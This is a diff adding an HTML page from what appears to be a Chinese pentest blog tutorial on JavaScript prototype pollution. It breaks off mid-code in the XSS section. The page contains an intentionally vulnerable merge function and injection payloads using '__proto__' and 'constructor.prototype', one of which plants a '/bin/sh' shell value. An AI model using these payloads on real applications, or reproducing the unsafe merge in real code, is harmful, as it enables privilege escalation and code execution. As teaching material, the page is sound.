@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="深入剖析 JavaScript 原型链污染漏洞的原理、利用链（从XSS到RCE）以及自动化检测工具 ppfuzz 的实战应用。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="原型链污染攻击">
+<meta property="og:url" content="https://congliang.github.io/Prototype-pollution/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="深入剖析 JavaScript 原型链污染漏洞的原理、利用链（从XSS到RCE）以及自动化检测工具 ppfuzz 的实战应用。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-07-15T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:35:18.338Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/Prototype-pollution/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/Prototype-pollution/","path":"Prototype-pollution/","title":"原型链污染攻击"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>原型链污染攻击 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%8E%9F%E5%9E%8B%E9%93%BE%E5%9F%BA%E7%A1%80%E5%9B%9E%E9%A1%BE"><span class="nav-number">2.</span> <span class="nav-text">一、原型链基础回顾</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E4%B8%89%E4%B8%AA%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5"><span class="nav-number">2.1.</span> <span class="nav-text">1.1 三个核心概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E5%B1%9E%E6%80%A7%E8%A7%A3%E6%9E%90%E8%BF%87%E7%A8%8B%EF%BC%88%E6%B5%81%E7%A8%8B%E5%9B%BE%EF%BC%89"><span class="nav-number">2.2.</span> <span class="nav-text">1.2 属性解析过程（流程图）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0%EF%BC%9A%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%AF%B9%E8%B1%A1%E6%93%8D%E4%BD%9C"><span class="nav-number">3.</span> <span class="nav-text">二、漏洞成因：不安全的对象操作</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-%E5%85%B8%E5%9E%8B%E8%84%86%E5%BC%B1%E5%87%BD%E6%95%B0"><span class="nav-number">3.1.</span> <span class="nav-text">2.1 典型脆弱函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-%E7%9C%9F%E5%AE%9E%E4%B8%96%E7%95%8C%E4%B8%AD%E7%9A%84%E8%84%86%E5%BC%B1%E7%82%B9"><span class="nav-number">3.2.</span> <span class="nav-text">2.2 真实世界中的脆弱点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-%E6%9B%B4%E5%A4%9A%E6%94%BB%E5%87%BB%E5%90%91%E9%87%8F"><span class="nav-number">3.3.</span> <span class="nav-text">2.3 更多攻击向量</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%9A%84%E6%94%BB%E5%87%BB%E9%93%BE"><span class="nav-number">4.</span> <span class="nav-text">三、从信息泄露到远程代码执行的攻击链</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5%EF%BC%9A%E6%B1%A1%E6%9F%93%E7%94%9F%E6%95%88-%E2%86%92-%E5%89%8D%E7%AB%AF-XSS"><span class="nav-number">4.1.</span> <span class="nav-text">3.1 第一阶段：污染生效 → 前端 XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5%EF%BC%9A%E6%B1%A1%E6%9F%93%E7%94%9F%E6%95%88-%E2%86%92-SQL-%E6%B3%A8%E5%85%A5"><span class="nav-number">4.2.</span> <span class="nav-text">3.2 第二阶段：污染生效 → SQL 注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-%E7%AC%AC%E4%B8%89%E9%98%B6%E6%AE%B5%EF%BC%9A%E6%B1%A1%E6%9F%93%E7%94%9F%E6%95%88-%E2%86%92-%E6%9C%8D%E5%8A%A1%E7%AB%AF-RCE"><span class="nav-number">4.3.</span> <span class="nav-text">3.3 第三阶段：污染生效 → 服务端 RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-%E5%88%A9%E7%94%A8%E9%93%BE%E5%85%A8%E6%99%AF%E5%9B%BE"><span class="nav-number">4.4.</span> <span class="nav-text">3.4 利用链全景图</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E8%87%AA%E5%8A%A8%E5%8C%96%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%EF%BC%9Appfuzz"><span class="nav-number">5.</span> <span class="nav-text">四、自动化检测工具：ppfuzz</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-%E5%AE%89%E8%A3%85%E4%B8%8E%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95"><span class="nav-number">5.1.</span> <span class="nav-text">4.1 安装与基础用法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-%E6%A3%80%E6%B5%8B%E5%8E%9F%E7%90%86"><span class="nav-number">5.2.</span> <span class="nav-text">4.2 检测原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-%E8%87%AA%E5%AE%9A%E4%B9%89%E6%A3%80%E6%B5%8B%E8%A7%84%E5%88%99"><span class="nav-number">5.3.</span> <span class="nav-text">4.3 自定义检测规则</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-4-%E6%89%8B%E5%B7%A5%E6%A3%80%E6%B5%8B%E6%8A%80%E6%B3%95"><span class="nav-number">5.4.</span> <span class="nav-text">4.4 手工检测技法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81CTF-%E7%BB%8F%E5%85%B8%E6%A1%88%E4%BE%8B%E5%89%96%E6%9E%90"><span class="nav-number">6.</span> <span class="nav-text">五、CTF 经典案例剖析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-%E6%A1%88%E4%BE%8B%E4%B8%80%EF%BC%9A-HITCON-CTF-Ghost-in-the-Prototype"><span class="nav-number">6.1.</span> <span class="nav-text">5.1 案例一：[HITCON CTF] Ghost in the Prototype</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-%E6%A1%88%E4%BE%8B%E4%BA%8C%EF%BC%9A%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93-ejs-%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E-RCE"><span class="nav-number">6.2.</span> <span class="nav-text">5.2 案例二：原型污染 + ejs 模板引擎 RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-%E6%A1%88%E4%BE%8B%E4%B8%89%EF%BC%9A%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93-pug-%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E-RCE"><span class="nav-number">6.3.</span> <span class="nav-text">5.3 案例三：原型污染 + pug 模板引擎 RCE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88"><span class="nav-number">7.</span> <span class="nav-text">六、防御方案</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#6-1-%E5%BC%80%E5%8F%91%E5%B1%82%E9%9D%A2"><span class="nav-number">7.1.</span> <span class="nav-text">6.1 开发层面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-2-%E8%BF%90%E7%BB%B4%E4%B8%8E%E6%9E%B6%E6%9E%84%E5%B1%82%E9%9D%A2"><span class="nav-number">7.2.</span> <span class="nav-text">6.2 运维与架构层面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-3-%E8%BF%90%E8%A1%8C%E6%97%B6%E7%9B%91%E6%8E%A7"><span class="nav-number">7.3.</span> <span class="nav-text">6.3 运行时监控</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81%E6%80%BB%E7%BB%93"><span class="nav-number">8.</span> <span class="nav-text">七、总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">9.</span> <span class="nav-text">参考链接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="nav-number">10.</span> <span class="nav-text">免责声明</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Prototype-pollution/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="原型链污染攻击 | 渗透测试实战记录">
+      <meta itemprop="description" content="深入剖析 JavaScript 原型链污染漏洞的原理、利用链（从XSS到RCE）以及自动化检测工具 ppfuzz 的实战应用。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          原型链污染攻击
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-07-15 08:00:00" itemprop="dateCreated datePublished" datetime="2026-07-15T08:00:00+08:00">2026-07-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:35:18" itemprop="dateModified" datetime="2026-06-04T23:35:18+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">深入剖析 JavaScript 原型链污染漏洞的原理、利用链（从XSS到RCE）以及自动化检测工具 ppfuzz 的实战应用。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在JavaScript中，一切皆为对象，而对象之间的继承机制依赖的正是<strong>原型链（Prototype Chain）</strong>。当你访问 <code>obj.key</code> 时，JavaScript 引擎会沿着 <code>obj.__proto__</code> → <code>obj.__proto__.__proto__</code> → … → <code>null</code> 的链路逐级查找，直到找到该属性或达到链的末端。</p>
+<p>原型链污染（Prototype Pollution）正是利用了这一机制：攻击者通过修改 <code>Object.prototype</code> 或其它构造函数的 <code>prototype</code> 对象，向原型链中注入恶意属性，从而影响所有继承自该原型的对象。本文将带你从原理到实战，全面掌握这一漏洞的挖掘与利用技巧。</p>
+<hr>
+<h2 id="一、原型链基础回顾"><a href="#一、原型链基础回顾" class="headerlink" title="一、原型链基础回顾"></a>一、原型链基础回顾</h2><h3 id="1-1-三个核心概念"><a href="#1-1-三个核心概念" class="headerlink" title="1.1 三个核心概念"></a>1.1 三个核心概念</h3><table>
+<thead>
+<tr>
+<th align="left">概念</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>__proto__</code></td>
+<td align="left">每个对象都有的隐式原型指针，指向其构造函数的 <code>prototype</code></td>
+</tr>
+<tr>
+<td align="left"><code>constructor.prototype</code></td>
+<td align="left">每个函数都有的显式原型对象，该函数构造出的实例的 <code>__proto__</code> 指向它</td>
+</tr>
+<tr>
+<td align="left"><code>Object.prototype</code></td>
+<td align="left">原型链的顶端，所有普通对象最终都会继承它的属性</td>
+</tr>
+</tbody></table>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 直观理解三者的关系</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> alice = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;Alice&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(alice.<span class="property">__proto__</span> === <span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>);          <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span> === <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span>);                     <span class="comment">// null</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-属性解析过程（流程图）"><a href="#1-2-属性解析过程（流程图）" class="headerlink" title="1.2 属性解析过程（流程图）"></a>1.2 属性解析过程（流程图）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">访问 obj.key</span><br><span class="line">     │</span><br><span class="line">     ▼</span><br><span class="line">obj 自身有 key 吗？ ──是──▶ 返回 obj.key</span><br><span class="line">     │ 否</span><br><span class="line">     ▼</span><br><span class="line">obj.__proto__ 有 key 吗？ ──是──▶ 返回 obj.__proto__.key</span><br><span class="line">     │ 否</span><br><span class="line">     ▼</span><br><span class="line">obj.__proto__.__proto__ 有 key 吗？ ──是──▶ 返回</span><br><span class="line">     │ 否</span><br><span class="line">     ▼</span><br><span class="line">   ... 继续沿链向上 ...</span><br><span class="line">     │</span><br><span class="line">     ▼</span><br><span class="line">   null（终点）──▶ 返回 undefined</span><br></pre></td></tr></table></figure>
+
+<p>一旦 <code>Object.prototype</code> 被污染（例如被注入 <code>polluted: true</code>），那么<strong>所有以 <code>Object.prototype</code> 为终点的对象</strong>在访问 <code>.polluted</code> 时都会返回 <code>true</code>，而它们自身从未定义过该属性。</p>
+<hr>
+<h2 id="二、漏洞成因：不安全的对象操作"><a href="#二、漏洞成因：不安全的对象操作" class="headerlink" title="二、漏洞成因：不安全的对象操作"></a>二、漏洞成因：不安全的对象操作</h2><p>原型链污染的根源在于**递归合并（merge）、克隆（clone）、路径赋值（extend&#x2F;set）**等操作没有对 <code>__proto__</code>、<code>constructor</code>、<code>prototype</code> 等特殊键做过滤，导致攻击者可以将数据写入原型对象。</p>
+<h3 id="2-1-典型脆弱函数"><a href="#2-1-典型脆弱函数" class="headerlink" title="2.1 典型脆弱函数"></a>2.1 典型脆弱函数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 脆弱合并函数 (merge)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> source[key] === <span class="string">&#x27;object&#x27;</span> &amp;&amp; source[key] !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!target[key]) target[key] = &#123;&#125;;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 攻击载荷</span></span><br><span class="line"><span class="keyword">const</span> malicious = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;isAdmin&quot;:true&#125;&#125;&#x27;</span>);</span><br><span class="line"><span class="title function_">merge</span>(&#123;&#125;, malicious);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 污染生效：所有普通对象现在都有了 isAdmin 属性</span></span><br><span class="line"><span class="keyword">const</span> user = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user.<span class="property">isAdmin</span>);  <span class="comment">// true ！</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-真实世界中的脆弱点"><a href="#2-2-真实世界中的脆弱点" class="headerlink" title="2.2 真实世界中的脆弱点"></a>2.2 真实世界中的脆弱点</h3><p>以下 npm 包的历史版本曾存在原型链污染漏洞（CVE编号可供自查）：</p>
+<table>
+<thead>
+<tr>
+<th align="left">包名</th>
+<th align="left">脆弱函数</th>
+<th align="left">CVE 示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>lodash</code> (&lt;4.17.11)</td>
+<td align="left"><code>_.defaultsDeep</code></td>
+<td align="left">CVE-2019-10744</td>
+</tr>
+<tr>
+<td align="left"><code>jQuery</code> (&lt;3.4.0)</td>
+<td align="left"><code>$.extend</code></td>
+<td align="left">CVE-2019-11358</td>
+</tr>
+<tr>
+<td align="left"><code>hoek</code> (&lt;6.1.3)</td>
+<td align="left"><code>hoek.merge</code></td>
+<td align="left">CVE-2018-3728</td>
+</tr>
+<tr>
+<td align="left"><code>deep-extend</code> (&lt;0.5.1)</td>
+<td align="left"><code>deepExtend</code></td>
+<td align="left">CVE-2018-3750</td>
+</tr>
+<tr>
+<td align="left"><code>merge-object</code></td>
+<td align="left"><code>merge()</code></td>
+<td align="left">CVE-2018-16487</td>
+</tr>
+<tr>
+<td align="left"><code>set-value</code> (&lt;3.0.1)</td>
+<td align="left"><code>set()</code></td>
+<td align="left">CVE-2019-10747</td>
+</tr>
+</tbody></table>
+<h3 id="2-3-更多攻击向量"><a href="#2-3-更多攻击向量" class="headerlink" title="2.3 更多攻击向量"></a>2.3 更多攻击向量</h3><p>除了直接使用 <code>__proto__</code>，攻击者还可以通过 <code>constructor.prototype</code> 绕过高版本 Node.js 对 <code>__proto__</code> 的部分限制：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 绕过技术：利用 constructor.prototype</span></span><br><span class="line"><span class="keyword">const</span> payload = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;shell&quot;:&quot;/bin/sh&quot;&#125;&#125;&#125;&#x27;</span>);</span><br><span class="line"><span class="title function_">merge</span>(&#123;&#125;, payload);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">shell</span>);  <span class="comment">// /bin/sh</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="三、从信息泄露到远程代码执行的攻击链"><a href="#三、从信息泄露到远程代码执行的攻击链" class="headerlink" title="三、从信息泄露到远程代码执行的攻击链"></a>三、从信息泄露到远程代码执行的攻击链</h2><p>原型链污染本身只是一个<strong>属性注入机制</strong>，但结合具体的应用逻辑，可以串联出从低危到高危的完整利用链。</p>
+<h3 id="3-1-第一阶段：污染生效-→-前端-XSS"><a href="#3-1-第一阶段：污染生效-→-前端-XSS" class="headerlink" title="3.1 第一阶段：污染生效 → 前端 XSS"></a>3.1 第一阶段：污染生效 → 前端 XSS</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 场景：模板引擎从配置对象中读取 sanitize 标志</span></span><br><span class="line"><span class="keyword">const</span> templateConfig = &#123;&#125;;</span><br><span class="line"><span class="comment">// ... merge 操作被污染，__proto__.sanitize = false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">renderHTML</span>(<span class="params">userInput</span>) &#123;</span><br><span class="line">    <span class="comment">// config.sanitize 从原型上读取到了 false</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">config</span>.<span class="property">sanitize</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">        userInput = <span class="title function_">escapeHtml</span>(userInput);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span 